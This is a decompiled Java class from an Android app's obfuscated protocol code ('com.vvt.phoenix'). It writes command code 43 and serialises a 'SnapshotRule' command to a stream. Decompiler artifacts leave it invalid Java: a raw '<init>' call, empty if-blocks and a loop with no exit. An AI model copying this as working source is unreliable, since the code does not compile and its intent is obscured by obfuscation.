package com.vvt.phoenix.prot.databuilder;

import com.vvt.phoenix.a.b;
import com.vvt.phoenix.prot.a.e;
import com.vvt.phoenix.prot.command.ah;
import java.io.OutputStream;

public class am
  extends r
{
  private static final boolean a;
  
  static
  {
    boolean bool = com.vvt.phoenix.a.a;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  protected OutputStream a(OutputStream paramOutputStream)
  {
    boolean bool = a;
    if (bool) {}
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((short)43);
    int i = 2;
    paramOutputStream.write(arrayOfByte, 0, i);
    bool = a;
    if (bool) {}
    return paramOutputStream;
  }
  
  protected String a()
  {
    return am.class.getName();
  }
  
  protected OutputStream b(OutputStream paramOutputStream)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = c();
    boolean bool2 = localObject instanceof ah;
    IllegalArgumentException localIllegalArgumentException;
    if (bool2)
    {
      localObject = e.a((ah)localObject);
      bool2 = false;
      localIllegalArgumentException = null;
      int i = localObject.length;
      paramOutputStream.write((byte[])localObject, 0, i);
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return paramOutputStream;
      localObject = a();
      localIllegalArgumentException = new java/lang/IllegalArgumentException;
      String str = "command data is not a SnapshotRule instance!";
      localIllegalArgumentException.<init>(str);
      b.a((String)localObject, localIllegalArgumentException);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/databuilder/am.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */